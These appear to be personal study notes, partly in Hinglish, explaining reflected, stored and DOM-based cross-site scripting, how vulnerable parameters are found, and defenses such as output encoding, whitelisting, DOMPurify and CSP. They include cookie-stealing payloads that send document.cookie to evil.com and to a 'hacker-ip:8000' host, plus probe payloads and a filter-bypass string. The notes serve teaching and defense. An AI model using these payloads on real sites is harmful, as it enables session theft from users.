XSS is a vulnerability that allows an attacker to inject malicious JavaScript code into a legitimate website. When a victim visits the site, the malicious code executes in their browser.

**The Core Mechanism** It happens because the application takes **User Input** and outputs it to the web page without **Sanitizing** (cleaning) or **Encoding** it. The browser gets confused and thinks the input is executable code.

**Types of XSS**

# Reflected XSS:
The script comes from the current HTTP request (e.g., URL parameters). It bounces off the server and executes immediately. Requires the attacker to send a link to the victim.


### **Reflected XSS Attack Workflow**

#### **1. The Core Concept**

In Reflected XSS, the malicious script (virus) is **NOT stored** in the website's database. Instead, the malicious script travels inside the **URL (Link)** itself.

**Reflected XSS**
```
┌─────────────┐
│  ATTACKER   │
└──────┬──────┘
       │
       │ Step 1: Creates malicious link
       │
       ▼
┌─────────────────────────────────────────────────────┐
│ Malicious Link:                                     │
│ https://bank.com/search?q=<script>                  │
│ document.location='http://evil.com/steal?cookie='  │
│ +document.cookie</script>                           │
└──────┬──────────────────────────────────────────────┘
       │
       │ Step 2: Sends link to victim (email/message)
       │
       ▼
┌─────────────┐
│   VICTIM    │
└──────┬──────┘
       │
       │ Step 3: Victim clicks the link
       │
       ▼
┌─────────────────────┐
│ VULNERABLE WEBSITE  │
│    (bank.com)       │
└──────┬──────────────┘
       │
       │ Step 4: Website reflects the script in response
       │
       ▼
┌─────────────────────┐
│  VICTIM'S BROWSER   │
│  Executes script!   │
└──────┬──────────────┘
       │
       │ Step 5: Cookie sent to attacker
       │
       ▼
┌─────────────────────┐
│  ATTACKER'S SERVER  │
│    (evil.com)       │
│  Receives cookie!   │
└─────────────────────┘
```
#### **2. The Step-by-Step Attack Flow**

**Step A: Discovery (The Self-Hack)**

- **Action:** The attacker tests a website (`reflected.com`) by typing `<script>alert(1)</script>` into the **Search Box**.
    
- **Observation:** The website displays the script back to the screen, and the alert pops up.
    
- **Conclusion:** The website is vulnerable because it reflects input without checking it. But right now, only the Attacker sees the alert.
    

**Step B: Weaponization (Creating the Bomb)**

- Since the script isn't saved on the server, the attacker must put the script into a format the victim can use.
    
- **The Weapon:** The attacker crafts a specific **URL**: `http://reflected.com/search?q=<script>steal_cookies()</script>`
```
reflected.com/search?q=<script>fetch('http://hacker-ip:8000/?cookie='+document.cookie)</script>
```
    
- _Note:_ The "Virus" is now embedded inside this link.
    

**Step C: Delivery (The Trap)**

- **Action:** The attacker sends this link to the Victim via Email, SMS, or WhatsApp.
    
- **Social Engineering:** The attacker uses a trick to make the victim click:
    
    > _"Click here to get a free iPhone!"_
    

**Step D: Execution (The Reflection)**

1. **Victim Clicks:** The victim trusts the domain (`reflected.com`) and clicks the link.
    
2. **Request Sent:** The victim's browser sends the request (containing the script in the URL) to the server. 
   reflected.com= goes to real server and server response back the victim
    
3. **Server Reflects:** The server receives the request, sees the search term, and immediately sends it back in the HTML response: _"Results for:
     `<script>`
    
4. **Browser Executes:** The victim's browser sees the script tags in the response and executes them.
      hacker-ip:8000= this request goes to attacker server/terminal 
    
5. **Damage Done:** The victim's cookies are sent to the attacker.


## Injection point / Vulnerable Parameters

==INPUT POINTS== where we can enter data ex:-

A. Search Boxes (`q`, `search`, `term`, `query`)
- **Normal URL:** `website.com/products?q=iphone`
    
- **Server Response:** _"Showing results for **iphone**"_
    
- **Why Vulnerable?** Kyunki search engine user ke keyword ko as-it-is screen par dikha deta hai.
    
- **Attack:** `?q=<script>alert(1)</script>`

B. Error Messages (`error`, `msg`, `message`)
- **Normal URL:** `website.com/login?error=IncorrectPassword`
    
- **Server Response:** Page ke upar laal rang mein likha aata hai: _"Error: **IncorrectPassword**"_
    
- **Why Vulnerable?** Developer URL se text uthakar seedha page par print kar raha hai.
    
- **Attack:** `?error=<script>alert('Hacked')</script>`

C. Page Navigation (`p`, `page`, `id`)
- **Normal URL:** `website.com/blog?p=5`
    
- **Server Response:** Kabhi-kabhi "Previous" ya "Next" button ke links mein ye number reflect hota hai.
    
- **Attack:** `?p=5"><script>alert(1)</script>`

D. Form Input Names (`name`, `email`)
- **Scenario:** Aapne form bhara aur submit kiya.
    
- **Response:** "Thank you **Ram**, we received your message."
    
- **Attack:** Agar aapne naam ki jagah script likh di, to wo reflect ho jayegi.


## **How to Identify?** 
Use a random alphanumeric string (called a "Canary" or "Probe"), like `XSS_TEST_123`. Submit it and check the page source code. If you see your string reflected exactly as you typed it inside the HTML tags, that parameter is likely vulnerable.

ex:-
```
<h1> You searched for: XSS_TEST_123 </h1>
```


## Prevention of Reflected XSS
#### **1. Output Encoding (Context-Aware Encoding)**

- **Definition:** Converting special characters into their corresponding HTML entities so the browser interprets them as text, not code.
    
- **Mechanism:**
    
    - `<` becomes `&lt;`
        
    - `>` becomes `&gt;`

```
<script> 
RETURNS:-
&lt;script&gt;
```
- **Why it works:** It neutralizes the malicious tags. The script is displayed on the screen but never executes.
    
- **Where to apply:** On every piece of user data before it is rendered (displayed) in the HTML.

#### **2. Input Validation (Whitelisting)**

- **Definition:** Checking the user input against a strict rule of "Allowed Characters."
    
- **Strategy:** Use **Whitelisting** (Allow only good known characters) instead of Blacklisting (Blocking bad characters).
    
- **Example:** If a parameter is for a "Year", allow only digits `[0-9]`. Reject everything else.

#### **3.Content Security Policy (CSP)**

- **Definition:** An HTTP response header that lets site administrators declare approved sources of content that browsers are allowed to load.
    
- **Benefit:** It can mitigate the impact of XSS vulnerabilities. Even if an attacker injects a script, the CSP can stop the browser from executing it if it violates the policy (e.g., blocking inline scripts).



# Stored XSS

**Definition:** Stored XSS occurs when a malicious script is permanently stored on the target server (usually in a database). The victim retrieves the malicious script from the server when they visit the page.

**The Mechanism**

- **Input:** Attacker inputs a script into a storage area (Comments, Profiles, Logs).
```
    Nice blog! <script>steal_admin_cookies()</script>
```
- **Storage:** The application saves the input in the DB without sanitization.
    
- **Output:** The application serves the stored script to other users viewing that page.

#### **Storage (The Mistake)**

Server us comment ko leta hai aur bina check kiye apne **Database** mein save kar leta hai.

- Database entry: `ID: 101 | User: Hacker | Comment: <script>...</script>`

#### **Execution (The Blast)**

Ab **Victim** (e.g., Admin ya Normal User) us blog post ko padhne aata hai.

- Server database se comment uthata hai aur page par load karta hai.
    
- Browser script ko dekhta hai aur run kar deta hai.
    
- **Result:** Victim hack ho gaya, bina kisi link par click kiye.


## Prevention

- **Entry Gate (Input Validation):** Jab data database mein ja raha ho.
    
- **Exit Gate (Output Encoding):** Jab data database se nikal kar user ki screen par ja raha ho

### 1. Output Encoding (The Main Defense)

**Logic:** Bhale hi hacker ne database mein `<script>...` save karwa diya ho. Lekin jab hum us data
      ko **Fetch** karke page par dikhayenge, hum use **Text** mein badal denge.

- **Database mein:** `<script>alert(1)</script>`
    
- **Screen par dikhate waqt:** `&lt;script&gt;alert(1)&lt;/script&gt;`
    

**Browser Ka Reaction:** Browser dekhega: _"Oh, ye code nahi hai, ye to bas text hai."_ Aur wo script ko run karne ke bajaye screen par print kar dega.


### 2. Input Validation (The Filter)

**Whitelisting (Strict Rules):** Hum define karenge ki user kya likh sakta hai.

- **Username:** Sirf `A-Z` aur `0-9`. (Agar `<` aaya to reject).
    
- **Age:** Sirf Numbers.
    

**Lekin, ek problem hai:** Agar "Blog Comment" section hai, to wahan user `<` ya `>` use kar sakta hai (Maths explain karne ke liye). Wahan hum strict validation nahi laga sakte. Isliye **Output Encoding** zyada zaroori hai.


### **3. Sanitization Libraries (For Rich Text)**

Kabhi-kabhi hum chahte hain ki user **Bold** (`<b>`) ya **Italic** (`<i>`) use kar sake, lekin Script (`<script>`) nahi.

Aise mein hum **Sanitization Libraries** use karte hain (Jaise **DOMPurify**). Yeh libraries "Achhe Tags" (`<b>`, `<p>`) ko aane deti hain aur "Bure Tags" (`<script>`, `<object>`) ko nikaal kar fenk deti hain.


### **4. CSP (Content Security Policy)**

Yeh wahi **"Insurance Policy"** hai jo Reflected XSS mein thi. Agar galti se developer encoding bhool gaya, to CSP browser ko rok dega ki wo database se aayi hui script ko run na kare.



[^1]**1. Context-Aware Output Encoding (Primary Defense)**

- **What:** Converting special characters into HTML entities _at the moment the data is displayed_ to the user.
    
- **Why:** Even if the database contains a malicious script, encoding ensures the browser treats it as harmless text, not executable code.
    
- **Rule:** Encode data right before rendering it on the screen, not just when storing it.
    

**2. Input Validation (Secondary Defense)**

- **What:** Validating data against a strict **Whitelist** before saving it to the database.
    
- **Limit Length:** Restrict the number of characters (e.g., Username max 50 chars) to make it harder to inject long payloads.
    
- **Type Check:** Ensure age is an integer, email is a valid email format, etc.
    

**3. Sanitization (For Rich Text)**

- If the website allows users to post HTML (like bold text or images in comments), use a trusted library like **DOMPurify**.
    
- **Never** try to write your own "Blacklist" regex (like `replace('<script>', '')`) because hackers can easily bypass it (e.g., `<scr<script>ipt>`).
    

**4. Content Security Policy (CSP)**

- Implement headers to restrict the sources from which scripts can be loaded. This acts as a safety net if the above controls fail.

==**[^1]:**== 


# DOM-based XSS

[#**Rule:** Browser kabhi bhi `#` ke baad ka hissa Server ko nahi bhejta.]()
ex:-
```
vulnerable.com/page#<script>alert(1)</script>
<script>alert(1)</script> does not go to server.
```


